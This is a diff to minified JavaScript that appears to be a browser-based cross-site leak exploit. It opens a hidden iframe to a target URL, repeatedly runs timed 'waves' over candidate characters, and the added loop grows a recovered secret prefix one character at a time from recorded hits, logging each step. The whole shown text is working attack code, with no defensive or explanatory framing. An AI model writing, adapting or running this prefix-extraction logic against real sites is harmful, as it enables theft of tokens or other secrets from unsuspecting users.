@@ -35,9 +35,18 @@ const t0=Date.now();let dn=0;const n=chars.length;let tk=0;const ds=[];
  await new Promise(res=>{const f=document.createElement('iframe');f.style.cssText='display:none';
   f.onload=()=>{logj({ev:'mk',t:Date.now()-m0});res()};f.onerror=()=>{logj({ev:'mk',err:1});res()};setTimeout(res,2500);f.src=B+'?m='+RID;document.body.appendChild(f);});
  for(let i=0;i<ids.length&&EL()<20000;i++){
-  const x=ids[i];const id=x.id,pfx=x.pfx;
+  const x=ids[i];let id=x.id,pfx=x.pfx;
   await wave(id,pfx,C1,i);if(EL()>20000){logj({ev:'cut',i:i});break;}
   await wave(id,pfx,C2,i);logj({ev:'iddone',i:i,id:id,p:pfx});
+  let guard=0;
+  while(EL()<19500&&guard++<30){
+   const hs=Object.keys((HIT[id]||{})).filter(k=>k.length===((pfx||'')+'').length+1&&k.startsWith(pfx||''));
+   if(!hs.length)break;
+   const c=hs[0].slice(((pfx||'')+'').length);pfx=(pfx||'')+c;
+   logj({ev:'bfs',id:id,p:pfx,alt:hs.length});
+   await wave(id,pfx,C1,i);if(EL()>19500)break;
+   await wave(id,pfx,C2,i);logj({ev:'bfsdone',id:id,p:pfx});
+  }
  }
  logj({ev:'done',hits:HIT});
 })();
